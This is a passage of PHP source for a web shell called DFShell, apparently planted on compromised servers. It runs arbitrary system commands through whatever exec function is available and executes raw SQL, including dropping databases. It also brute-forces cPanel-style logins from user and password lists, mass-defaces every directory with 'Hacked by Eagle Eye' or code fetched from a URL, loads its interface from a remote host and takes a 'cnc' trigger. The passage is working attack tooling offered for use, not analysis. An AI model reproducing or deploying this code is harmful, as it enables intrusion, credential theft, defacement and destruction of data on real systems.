                    $GLOBALS['DFSyntax'][3]($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT']);
                }
                echo "<section id='dfsrename'>";
                if(isset($GLOBALS['DFConfig'][1]['newfile'])){
                    if(file_exists($pathfile)){
                        $dfsRen = preg_replace("/".basename($pathfile)."/i",$GLOBALS['DFConfig'][1]['newfile'],$pathfile);
                        if(rename($pathfile,$dfsRen)){
                            $this->DFSPopupMSG(5,"","File successfully renamed!","",true);
                            echo "<script>setTimeout(function(){ window.location.replace('?dfp=".urlencode($GLOBALS['DFConfig'][1]['reflink'])."') },1500);</script>";
                        }else{
                            $this->DFSPopupMSG(4,null,"Permission denied!",null,true);
                        }
                    }else{
                        $this->DFSPopupMSG(4,null,"No such file/directory!",null,true);
                    }
                }else{
                    $dfsren = preg_replace("/".basename($pathfile)."/i","",$pathfile);
                    $this->string = $dfsren;
                    echo "<form action='' method='POST'>
                    <input type='hidden' name='reflink' value='".$this->Enc()."'>
                    <table><tr><td>
                    <label>Full path : </label></td><td>
                    <label>".$pathfile." </label></td></tr><tr>
                    <td><label>New name : </label></td><td>
                    <input type='text' name='newfile' placeholder='".basename($pathfile)."'></td></tr><tr>
                    <td></td><td><input type='submit' value='Rename'></tr>
                    </table></form>";
                }
                echo "</section>";
            break;
            case "sql":
                echo "<section class='databases'>";
                if(isset($_SESSION['sql_auth'])){
                    $sqldat = explode('|--|',$_SESSION['sql_auth']);
                    $conn = mysqli_connect($sqldat[0],$sqldat[1],$sqldat[2]);
                    if(isset($GLOBALS['DFConfig'][1]['other'])){
                        $this->DFSPopupMSG(1,"Get Adminer","Please get adminer from link below","<a href=\'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-mysql-en.php\'>Adminer</a>",true);
                    }else if(isset($GLOBALS['DFConfig'][1]['sqldrop'])){
                        $ftar = array("'",'"');
                        if(!isset($GLOBALS['DFConfig'][0]['tbname'])){
                            mysqli_select_db($conn,$GLOBALS['DFConfig'][0]['dbname']);
                            $dropping = str_replace($ftar,"",$GLOBALS['DFConfig'][0]['dbname']);
                            $dropsql = "DROP DATABASE $dropping";
                            $query = mysqli_query($conn,$dropsql) or exit(mysqli_error($conn));
                            $this->DFSPopupMSG(3,null,"Database DROPPED!",null,false);
                        }else{
                            mysqli_select_db($conn,$GLOBALS['DFConfig'][0]['dbname']);
                            $dropping = str_replace($ftar,"",$GLOBALS['DFConfig'][0]['tbname']);
                            $dropsql = "DROP TABLE $dropping";
                            $query = mysqli_query($conn,$dropsql) or exit(mysqli_error($conn));
                            $this->DFSPopupMSG(3,null,"Table DROPPED!",null,false);
                        }
                    }else if(isset($GLOBALS['DFConfig'][1]['sqlcommands'])){
                        if(isset($GLOBALS['DFConfig'][0]['dbname'])){
                            mysqli_select_db($conn,$GLOBALS['DFConfig'][0]['dbname']);
                            $inject = $GLOBALS['DFConfig'][1]['sqlcommands'];
                            $query = mysqli_query($conn,$inject) or exit(mysqli_error($conn));
                            $this->DFSPopupMSG(3,null,"Command executed!",null,false);
                        }else{
                            $inject = $GLOBALS['DFConfig'][1]['sqlcommands'];
                            $query = mysqli_query($conn,$inject) or exit(mysqli_error($conn));
                            $this->DFSPopupMSG(3,null,"Command executed!",null,false);
                        }
                    }else{

                        echo "<div id='sqlside'>
                        <form action='' method='POST'><input type='submit' value='Logout' name='sqllogout'></form>
                        <form action='' method='POST'><input type='submit' name='other' value='Get Adminer'></form>";
                        if(isset($GLOBALS['DFConfig'][0]['tbname']) || isset($GLOBALS['DFConfig'][0]['dbname'])){
                            echo "<form action='' method='POST'>
                            <input style='background:red;' type='submit' name='sqldrop' value='DROP'></form>";
                        }
                        echo "</div>
                        <form action='' method='POST'><table><tr><td><textarea name='sqlcommands' placeholder='Theres no output ,just use for edit value in database' name='sqlcmd'></textarea>
                        </td></tr><tr><td><input type='submit' value='Execute'></td></tr></table></form>";
                        echo "<div id='fieldx'><label>Connected to mysql</label><br>";

                        if(!isset($GLOBALS['DFConfig'][0]['dbname'])){
                            echo "<button><a id='blacky' href='?dfaction=sql'>Back</a></button><br>";
                        }else{
                            if(!isset($GLOBALS['DFConfig'][0]['tbname'])){
                                echo "<button><a id='blacky' href='?dfaction=sql'>Back</a></button><br>";
                            }else{
                                echo "<button><a id='blacky' href='?dfaction=sql&dbname=".$GLOBALS['DFConfig'][0]['dbname']."'>Back</a></button>
                                     <br>";
                            }
                        }

                        if(isset($GLOBALS['DFConfig'][0]['dbname'])){
                            $dbs = mysqli_real_escape_string($conn,$GLOBALS['DFConfig'][0]['dbname']);
                            $sql = "select table_name from information_schema.tables where table_schema='$dbs';";
                            $query = mysqli_query($conn,$sql) or exit(mysqli_error($conn));
                            while($fetch = mysqli_fetch_assoc($query)){
                                echo "<a href='?dfaction=sql&dbname=".$dbs."&tbname=".$fetch['table_name'] ."'>". $fetch['table_name'] . "</a><br>";
                            }
                            echo "</div><div id='sqlcol'>";
                            if(isset($GLOBALS['DFConfig'][0]['tbname'])){
                                if(!isset($GLOBALS['DFConfig'][0]['limit'])){
                                    mysqli_select_db($conn,$dbs);
                                    $tbl = mysqli_real_escape_string($conn,$GLOBALS['DFConfig'][0]['tbname']);
                                    $sql = "select column_name from information_schema.columns where table_name='$tbl'";
                                    $sql1 = "select * from $tbl limit 20";
                                    $query = mysqli_query($conn,$sql) or exit(mysqli_error($conn));
                                    $query1 = mysqli_query($conn,$sql1) or exit(mysqli_error($conn));
                                    echo "<table>";
                                    while($fetch=mysqli_fetch_assoc($query)){
                                        echo "<th>".$fetch['column_name']."</th>";
                                    }
                                    while($fetch1=mysqli_fetch_assoc($query1)){
                                        echo "<tr>";
                                        foreach($fetch1 as $key => $val){
                                            echo "<td>".$val."</td>";
                                        }
                                        echo "</tr>";
                                    }
                                    $total_row=mysqli_num_rows($query1);
                                    echo "</table>";
                                    if($total_row>0){
                                        echo "<form action='' method='GET'><table>";
                                        echo "<input type='hidden' value='sql' name='dfaction'>";
                                        echo "<input type='hidden' value='".$dbs."' name='dbname'>";
                                        echo "<input type='hidden' value='".$tbl."' name='tbname'>";
                                        echo "<tr><td><label>Set offset,limit</label></td><td>
                                        <input type='text' placeholder='eg: 20,50' name='limit'></td></tr>
                                        <tr><td></td><td><input type='submit' value='Lets Go'></td></tr>";
                                        echo "</table></form>";
                                    }
                                    echo "</div>";
                                }else{
                                    $limits = explode(',',$GLOBALS['DFConfig'][0]['limit']);
                                    $offset = intval($limits[0]);
                                    $limit = intval($limits[1]);
                                    mysqli_select_db($conn,$dbs);
                                    $tbl = mysqli_real_escape_string($conn,$GLOBALS['DFConfig'][0]['tbname']);
                                    $sql = "select column_name from information_schema.columns where table_name='$tbl'";
                                    $sql1 = "select * from $tbl limit $offset,$limit";
                                    $query = mysqli_query($conn,$sql) or exit(mysqli_error($conn));
                                    $query1 = mysqli_query($conn,$sql1) or exit(mysqli_error($conn));
                                    echo "<table>";
                                    while($fetch=mysqli_fetch_assoc($query)){
                                        echo "<th>".$fetch['column_name']."</th>";
                                    }
                                    while($fetch1=mysqli_fetch_assoc($query1)){
                                        echo "<tr>";
                                        foreach($fetch1 as $key => $val){
                                            echo "<td>".$val."</td>";
                                        }
                                        echo "</tr>";
                                    }
                                    echo "</table>";
                                    $total_row=mysqli_num_rows($query1);
                                    if($total_row>0){
                                        echo "<form action='' method='GET'><table>";
                                        echo "<input type='hidden' value='sql' name='dfaction'>";
                                        echo "<input type='hidden' value='".$dbs."' name='dbname'>";
                                        echo "<input type='hidden' value='".$tbl."' name='tbname'>";
                                        echo "<tr><td><label>Set offset,limit</label></td><td>
                                        <input type='text' placeholder='eg: 20,50' name='limit'></td></tr>
                                        <tr><td></td><td><input type='submit' value='Lets Go'></td></tr>";
                                        echo "</table></form>";
                                    }
                                    echo"</div>";
                                }

                            }
                        }else{
                            $sql = "select schema_name from information_schema.schemata";
                            $query = mysqli_query($conn,$sql) or exit(mysqli_error($conn));
                            while($fetch = mysqli_fetch_assoc($query)){
                                echo "<a href='?dfaction=sql&dbname=".$fetch['schema_name']."'>". $fetch['schema_name'] . "</a><br>";
                            }
                            echo "</div>";
                        }

                        if(isset($GLOBALS['DFConfig'][1]['sqllogout'])){
                            $_SESSION['sql_auth'] = null;
                            unset($_SESSION['sql_auth']);
                            echo "<script>window.location.replace('?dfaction=sql');</script>";
                        }
                        if(isset($GLOBALS['DFConfig'][1]['sqlcmd'])){
                            $sqlcmd = $GLOBALS['DFConfig'][1]['sqlcmd'];
                            $qrycmd = mysqli_query($conn,$sqlcmd) or exit(mysqli_error($conn));
                            $this->DFSPopupMSG(1,"SQL Query","Command successfully executed!","",true);
                        }
                    }
                }else{
                    if(!isset($GLOBALS['DFConfig'][1]['connect_sql'])){
                        echo explode('||',$GLOBALS['DFSyntax'][0](self::$remote_url.'/others.html'))[4];
                    }else{
                        $tmp_conn = mysqli_connect($GLOBALS['DFConfig'][1]['sqlhost'],$GLOBALS['DFConfig'][1]['sqluser'],$GLOBALS['DFConfig'][1]['sqlpass']) or exit($this->DFSPopupMSG(2,"MySQL Connection","Cannot connect to database!","",true));
                        if(!mysqli_connect_errno()){
                            $_SESSION['sql_auth'] = $GLOBALS['DFConfig'][1]['sqlhost']."|--|".$GLOBALS['DFConfig'][1]['sqluser']."|--|".$GLOBALS['DFConfig'][1]['sqlpass'];
                            echo "<script>window.location.replace(window.location.href);</script>";
                        }else{
                            echo "Failed to connect mysql";
                            exit;
                        }
                    }
                }
                echo "</section>";
            break;
            case "logout":
                unset($_SESSION['DFS_Auth']);
                session_destroy();
                echo "<script>window.location.replace('".$GLOBALS['DFConfig'][2]['PHP_SELF']."')</script>";
            break;
            case "crack":
                if(!isset($GLOBALS['DFConfig'][1]['crack'])){
                    echo explode('||',$GLOBALS['DFSyntax'][0](self::$remote_url.'/others.html'))[0];
                }else{
                    $host = $GLOBALS['DFConfig'][1]['host'];
                    $user = explode("\n",$GLOBALS['DFConfig'][1]['userlist']);
                    $pass = explode("\n",$GLOBALS['DFConfig'][1]['passlist']);
                    $port = $GLOBALS['DFConfig'][1]['portc'];
                    $timeout = $GLOBALS['DFConfig'][1]['timeout'];
                    echo "<section class='crackresults'>";
                    foreach($user as $u){
                        print("<p>Trying for user -> ".$u."</p>");
                        foreach($pass as $p){
                            $this->DFSCracker(trim($host),$port,trim($u),trim($p),trim($timeout));
                        }
                    }
                    echo "<p>Done!</p>";
                    echo "</section>";
                }
            break;
            case "mass":
                $slashtype = $this->DFSSlash();
                echo "<section class='mass'>";
                if(!isset($GLOBALS['DFConfig'][1]['dfmass'])){
                    echo explode('||',$GLOBALS['DFSyntax'][0](self::$remote_url.'/others.html'))[2];
                }else{
                    $arrpath = glob($GLOBALS['DFConfig'][1]['masspath'] . $slashtype . '*', GLOB_ONLYDIR);
                    
                    if(!empty($GLOBALS['DFConfig'][1]['fromurl']) && 
                    $GLOBALS['DFConfig'][1]['fromurl']!=="" &&
                    $GLOBALS['DFConfig'][1]['fromurl']!==NULL){
                        if(filter_var($GLOBALS['DFConfig'][1]['fromurl'], FILTER_VALIDATE_URL)){
                            $ncode = file_get_contents($GLOBALS['DFConfig'][1]['fromurl']);
                        }else{
                            die("<script>alert('Check url');window.location.replace(window.location.href);</script>");
                        }
                    }else{
                        $ncode = $GLOBALS['DFConfig'][1]['codemass'] ?: 'Hacked by Eagle Eye';
                    }
                    $lekluh = $GLOBALS['DFConfig'][1]['masspath'] . $slashtype . $GLOBALS['DFConfig'][1]['massname'];
                    $rakluh = fopen($lekluh,'w');
                    fwrite($rakluh,$ncode);
                    foreach($arrpath as $p){
                        $npath = $p . $slashtype . $GLOBALS['DFConfig'][1]['massname'];
                        $nopen = fopen($npath,'w');
                        fwrite($nopen,$ncode);
                        fclose($nopen);
                    }
                    fclose($rakluh);
                    $this->DFSPopupMSG(1,"Mass defacements","All file successfully created!","",true);
                }
                echo "</section>";
            break;
        }
    }

    public function DFSExecute($command){
        if(isset($GLOBALS['DFConfig'][0]['dfp'])){
            $GLOBALS['DFSyntax'][3]($this->Dec($GLOBALS['DFConfig'][0]['dfp']));
        }else{
            $GLOBALS['DFSyntax'][3]($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT']);
        }
        if($this->DFSDat('ini','disable_functions')!=="None"){
            $disCMD = explode(",",$this->DFSDat('ini','disable_functions'));
            $disCMD = array_map('trim', $disCMD);
            foreach($GLOBALS['DFSCmd'] as $cmd){
                if(!in_array($cmd,$disCMD)){
                    $availCMD = $cmd;
                    switch($availCMD){
                        case $GLOBALS['DFSCmd'][4]:
                            return $this->DFSProcOpen($command);
                        break;
                        case $GLOBALS['DFSCmd'][1]:
                        case $GLOBALS['DFSCmd'][2]:
                            print($availCMD($command));
                            return $GLOBALS['DFSCmd'][1]($command);
                        break;
                        default:
                        return $availCMD($command);
                        break;
                    }
                    break;
                }
            }

        }else{
            return system($command);
        }
    }

    private function DFSProcOpen($command){
        $descriptorspec = array(
            0 => array('pipe', 'r'), // shell can read from STDIN
            1 => array('pipe', 'w'), // shell can write to STDOUT
            2 => array('pipe', 'w')  // shell can write to STDERR
        );
        $exec = $command;
        $process = $GLOBALS['DFSCmd'][4]($exec, $descriptorspec, $pipes, null, null);
        
        if(is_resource($process)){
            $retCMD = $GLOBALS['DFSyntax'][14]($pipes[1]);
            echo $retCMD;
            proc_close($process);
        }else{
            echo "Fail to execute!";
        }
    }
    private function DFSWinPathCheck(){
        $partition = array("A:","B:","C:","D:","E:","F:","G:","H:","I:","J:","K:","L:","M:",
        "N:","O:","P:","Q:","R:","S:","T:","U:","V:","W:","X:","Y:","Z:");
        $available = array();
        foreach($partition as $part){
            if(is_dir($part)){
                array_push($available,$part);
            }
        }
        return $available;
    }

    private function DFSCracker($host,$port,$user,$pass,$timeout){
        $ch = curl_init();
    
        $qdata = array(
            'user'=>$user,
            'pass'=>$pass,
            'goto_uri'=>'/'
        );
    
        curl_setopt($ch, CURLOPT_URL, "https://$host:" . $port . "/login/?login_only=1");
        curl_setopt($ch, CURLOPT_HEADER, TRUE);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $qdata);
        curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_FAILONERROR, 1);
    
        $data = curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    
        if ( curl_errno($ch) == 28 )
        {
            print "<b><font face=\"Verdana\" style=\"font-size: 9pt\">
            <font color=\"#AA0000\">Error :</font> <font color=\"#008000\">Connection Timeout
            , Sleep for 5s .</font></font></b></p>";
            sleep(5);
        }
        else if ( curl_errno($ch) == 0 )
        {
            print "<b><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#008000\">[~]</font></b><font face=\"Tahoma\"   style=\"font-size: 9pt\"><b><font color=\"#008000\"> 
            Cracking Success With Username &quot;</font><font color=\"#FF0000\">$user</font><font color=\"#008000\">\"
            and Password \"</font><font color=\"#FF0000\">$pass</font><font color=\"#008000\">\"</font></b><br><br>";
            exit;
        }
        else{
            if($httpcode===0){
                echo "No response <br>";
                curl_setopt($ch, CURLOPT_URL, "http://$host:" . $port);
                curl_setopt($ch, CURLOPT_HEADER, TRUE);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                $cont = curl_exec($ch);
                $farr = explode("URL=",$cont);
                $narr = explode('"></head>',$farr[1]);
                echo "Please change to this host -> ". $narr[0];
                exit;
            }
            //echo $httpcode;
        }
        curl_close($ch);
    }

    public function DFSCurrent($slashtype){
        echo "<div class='currentfolder'>Current folder : ";

        $truepath = array();
        
        if(isset($GLOBALS['DFConfig'][0]['dfp'])){
            $path = $this->DFSDirFilter($this->Dec($GLOBALS['DFConfig'][0]['dfp']));
            $path = $this->Dec($path);
        }else{
            $path = getcwd();
        }
        
        $dfsEP = explode($slashtype,$path);
        $dfsSZ = sizeof(($dfsEP));
        $dfsGE = "";
        for($c=0;$c<$dfsSZ;$c++){
            array_push($truepath,$dfsEP[$c]);
        }
        if($GLOBALS['DFSPlatform']!=='win'){
            $endslash = $this->DFSDirFilter($slashtype);
            echo "<a href='?dfp=".urlencode($endslash)."'>$slashtype</a>";
        }
        for($i=0;$i<sizeof($truepath);$i++){
            if(!empty($dfsEP[$i]) || !$dfsEP[$i]==""){
                if($GLOBALS['DFSPlatform']!=='win'){
                    $dfsGE .=  $slashtype . $dfsEP[$i];
                }else{
                    $dfsGE .= $dfsEP[$i] . $slashtype ;
                }
                
                $dfsGEn = $this->DFSDirFilter($dfsGE);
                //$this->string = preg_replace('/'.$slashtype.$slashtype.'/i',$slashtype,$dfsGE);
                echo "<a href='?dfp=".urlencode($dfsGEn)."'>$dfsEP[$i]</a>";
                echo $slashtype;
            }

        }
        
        echo "</div>";
    }

    public function DFSOG($file){
        if($GLOBALS['DFSPlatform']!=='win'){
            $owner_file = (fileowner($file)?:0);
            $group_file = (filegroup($file)?:0);
            $checkposix = $this->DFSDat('ini','disable_functions');
            if($checkposix !=="None"){
                $checkposix = explode(",",$checkposix);
                if(!in_array("posix_getpwuid",$checkposix)){
                    $ownx = posix_getpwuid($owner_file)['name']?:'nobody';
                    $grpx = posix_getpwuid($group_file)['name'];
                    if(($ownx!==NULL && $ownx!=="") || ($grpx!==NULL && $grpx!=="")){
                        $owner_group = $ownx . ':' . ($grpx?:$ownx);
                    }else{
                        $owner_group = "nobody:nobody";
                    }
                }else{
                    $owner_group = "-:-";
                }
            }else{
                $ownx = posix_getpwuid($owner_file)['name']?:'nobody';
                $grpx = posix_getpwuid($group_file)['name'];
                if(($ownx!==NULL && $ownx!=="") || ($grpx!==NULL && $grpx!=="")){
                    $owner_group = $ownx . ':' . ($grpx?:$ownx);
                }else{
                    $owner_group = "nobody:nobody";
                }
            }
            
        }else{
            $owner_group = "-:-";
        }
        return $owner_group;
    }

    public function DFSPerms($f) { // Special thanks to marijuana shell developer
        $p = $GLOBALS['DFSyntax'][1]($f);
        if (($p & 0xC000) == 0xC000) {
            $i = 's';
        } elseif (($p & 0xA000) == 0xA000) {
            $i = 'l';
        } elseif (($p & 0x8000) == 0x8000) {
            $i = '-';
        } elseif (($p & 0x6000) == 0x6000) {
            $i = 'b';
        } elseif (($p & 0x4000) == 0x4000) {
            $i = 'd';
        } elseif (($p & 0x2000) == 0x2000) {
            $i = 'c';
        } elseif (($p & 0x1000) == 0x1000) {
            $i = 'p';
        } else {
            $i = 'u';
        }
        $i .= (($p & 0x0100) ? 'r' : '-');
        $i .= (($p & 0x0080) ? 'w' : '-');
        $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
        $i .= (($p & 0x0020) ? 'r' : '-');
        $i .= (($p & 0x0010) ? 'w' : '-');
        $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
        $i .= (($p & 0x0004) ? 'r' : '-');
        $i .= (($p & 0x0002) ? 'w' : '-');
        $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
        return $i;
    }

    private function DFSMod($code){
        return substr(sprintf("%o",$code),-4);
    }

    public function DFSChange($loc,$code){
        $def = 0;
        for($i=strlen($code)-1;$i>=0;--$i)
            $def += (int)$code[$i]*pow(8, (strlen($code)-$i-1));
        if(is_dir($loc) || is_file($loc)){
            if(chmod($loc,$def)){
                return true;
            }else{
                return false;
            }
        }
    }

    public function DFSDat($ch,$value){
        switch(strtolower($ch)){
            case 'ini':
                if(strtolower($value)!=='disable_functions')
                {
                    if(!ini_get($value)){
                        return "OFF";
                    }else{
                        return "ON";
                    }
                }
                else
                {
                    if(!ini_get($value)){
                        return "None";
                    }else{
                        return ini_get($value);
                    }
                }
            break;
            case 'func':
                if(!function_exists($value)){
                    return "OFF";
                }else{
                    return "ON";
                }
            break;
        }
    }

    public function DFSInfo(){
        if($GLOBALS['DFSPlatform']==='lin'){
            $OSID = "";
        }
        $disklink = "";
        $encstr = array();
        $diskavail = $this->DFSWinPathCheck();
        foreach($diskavail as $item){
            $diskstr = $item . "\\";
            $this->string = $diskstr;
            $disklink .= "<a href='?dfp=".$this->Enc()."'>$diskstr</a> , ";
        }
        $contents = "<div class='intros'>
Server Info : ".substr(@php_uname(),0,120)."<br>
Server Software : ".$GLOBALS['DFConfig'][2]['SERVER_SOFTWARE']."<br>
Current User : ".get_current_user()." | Disk FreeSpace : ".$this->DFSFormat(diskfreespace($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT']))."<br>
Server Address : ".$GLOBALS['DFConfig'][2]['SERVER_ADDR']." | 
Your Address : ".$GLOBALS['DFConfig'][2]['REMOTE_ADDR']."<br>
Safe Mode : ".$this->DFSDat('ini','safe_mode')." |
Server Email : ".$GLOBALS['DFConfig'][2]['SERVER_ADMIN']."<br>
Disable Functions : ".$this->DFSDat('ini','disable_functions')." | 
cURL : ".$this->DFSDat('func','curl_version')." | 
MySQL : ".$this->DFSDat('func','mysql_connect')."<br>
Document Root : ".$GLOBALS['DFConfig'][2]['DOCUMENT_ROOT']." | Disk : ".$disklink."
</div>%{main}%";
        return $contents;
    }


    public function DFSRenderArray($array_replace,$contents){
        $arrRep = sizeof($array_replace);
        $x = 1;
        for($i=0;$i<$arrRep;$i++){
            $contents = $this->DFSRender("/%{A".$x."}%/i",$array_replace[$i],$contents);
            $x++;
        }
        return $contents;
    }

    public function DFSRender($pattern,$replace,$from){
        $contents = preg_replace($pattern,$replace,$from);
        return $contents;
    }
    public function DFSAdmin(){
        $contents = $GLOBALS['DFSyntax'][0](self::$remote_url . "/login.html");
        return $contents;
    }
    public function DFStart(){
        $contents = $GLOBALS['DFSyntax'][0](self::$remote_url . "/head.html");
        $contents = preg_replace('/%{style}%/i',$GLOBALS['DFSyntax'][0](self::$remote_url . "/dfs.css"),$contents); //example
        $contents = preg_replace('/%{js}%/i',$GLOBALS['DFSyntax'][0](self::$remote_url . "/script.js"),$contents);
        return $contents;
    }

    public function DFSBody($location,$pattern,$from){
        $contents = $GLOBALS['DFSyntax'][0](self::$remote_url . "/".$location);
        $from = $this->DFSRender($pattern,$contents,$from);
        return $from;
    }

    public function DFSEnd(){
        $contents = $GLOBALS['DFSyntax'][0](self::$remote_url . "/foot.html");
        return $contents;
    }
    public function DFSDefault(){
        $this->DFSAction('upload');
        $this->DFSAction('mkdir');
        $this->DFSAction('mkfile');
    }
    public function DFSDirFilter($path){
        if($GLOBALS['DFSPlatform']!=='win'){
            $x = preg_replace("/%2F%2F/i","/",(urlencode($path)));
        }else{
            $x = preg_replace("/%5C%5C/i","\\",(urlencode($path)));
        }
        $this->string = urldecode($x);
        return $this->Enc();
    }
}

$shell = new DFShell();

if(!isset($_SESSION['DFS_Auth']) || empty($_SESSION['DFS_Auth'])){
    if(isset($GLOBALS['DFConfig'][1]['login'])){
        $shell->string = $GLOBALS['DFConfig'][1]['password'];
        if($shell->DFSLogin(urlencode($shell->Enc()))){
            header('Location: '.$GLOBALS['DFConfig'][2]['REQUEST_URI']);
        }
    }else{
        echo $shell->DFSAdmin();
        if(isset($GLOBALS['DFConfig'][0]['cnc'])){
            $comex = explode(";",$GLOBALS['DFConfig'][0]['cnc']);
            if(is_array($comex) && count($comex)>1){
                $shell->triggered($comex[0],$comex[1]);
            }
        }
    }
}else{
    //process for update
    if(isset($GLOBALS['DFConfig'][0]['dfd']) && isset($GLOBALS['DFConfig'][0]['dfp']) && isset($GLOBALS['DFConfig'][0]['dfaction']) ){
        if(!empty($GLOBALS['DFConfig'][0]['dfd']) && !empty($GLOBALS['DFConfig'][0]['dfp']) && $GLOBALS['DFConfig'][0]['dfaction']=='download')
        {
            $shell->query = array($GLOBALS['DFConfig'][0]['dfp'],$GLOBALS['DFConfig'][0]['dfd']);
            $shell->DFSAction($GLOBALS['DFConfig'][0]['dfaction']);
        }
        else
        {
            echo "Path/File Undefined!";
        }
    }else{
        $contents = $shell->DFStart();
        $chead = $shell->DFSInfo();
        
       if(isset($DFConfig[0]['dfp'])){
           $cmdx = "?dfp=".urlencode($DFConfig[0]['dfp'])."&dfaction=cmd";
       }else{
        $cmdx = "?dfaction=cmd";
       }

        $toReplace = array($GLOBALS['DFConfig'][2]['PHP_SELF'],"?dfaction=conf","?dfaction=reverse",
                          "?dfaction=sym","?dfaction=crack",$cmdx,"?dfaction=mass","?dfaction=sql",
                          "?dfaction=dest","?dfaction=bombing","?dfaction=logout");

        $contents = $shell->DFSRender("/%{body}%/i","%{DFSI}%",$contents);
        $contents = $shell->DFSRender("/%{DFSI}%/i",$chead,$contents);
        $contents = $shell->DFSBody("bodytop.html","/%{main}%/i",$contents);
        $contents = $shell->DFSRenderArray($toReplace,$contents);
        echo $contents;

        if(!isset($DFConfig[0]['dfp'])){
            if(!isset($DFConfig[0]['dfaction']) || empty($DFConfig[0]['dfaction']))
            {
                $shell->string = $DFSyntax[4]();
                $shell->query = array($shell->Enc(),null);
                $shell->DFSAction("scand");
            }
            else
            {
                if(in_array($DFConfig[0]['dfaction'],$GLOBALS['DFSOptions'])){
                    //$shell->query = array($DFConfig[0]['dfp'],$DFConfig[0]['dff']);
                    $shell->DFSAction($DFConfig[0]['dfaction']);
                    //echo "works";
                }
            }
            $shell->DFSDefault();
        }else{
            //echo "<font color='white'>".$shell->Dec($DFConfig[0]['dfp'])."</font><br>";
            if(isset($DFConfig[0]['dff'])){
                if(!isset($DFConfig[0]['dfaction'])){
                    $shell->query = array($DFConfig[0]['dfp'],$DFConfig[0]['dff']);
                    $shell->DFSAction('view');
                }else{
                    $shell->query = array($DFConfig[0]['dfp'],$DFConfig[0]['dff']);
                    $shell->DFSAction($DFConfig[0]['dfaction']);
                }
            }else{

                if(isset($DFConfig[0]['dfaction'])){
                    $shell->query = array($DFConfig[0]['dfp'],null);
                    $shell->DFSAction($DFConfig[0]['dfaction']);
                }else{
                    $shell->query = array($DFConfig[0]['dfp'],null);
                    $shell->DFSAction('scand');
                }
            }
            $shell->query = array($DFConfig[0]['dfp'],null);
            $shell->DFSDefault();
        }

        if(isset($DFConfig[1]['toencstr'])){
            $shell->string = $DFConfig[1]['encstr'];
            $shell->DFSPopupMSG(1,"Encryption for ".$DFConfig[1]['encstr'],$shell->Enc(),"So you can change password",true);
        }
        $shell->DFSAction("zipping");
        $shell->DFSAction("massdel");
        $footer = $shell->DFSEnd();
        preg_match('/[0-9]\.[0-9]/i',$_SESSION['latest'],$match);
        $latestVersion = "V".($match[0]);
        if($_SESSION['need_update']){
            echo "<script>
            alert('New version available!\\nLatest version : ".$latestVersion."')
            </script>";
        }
        print($footer);
    }
}?>
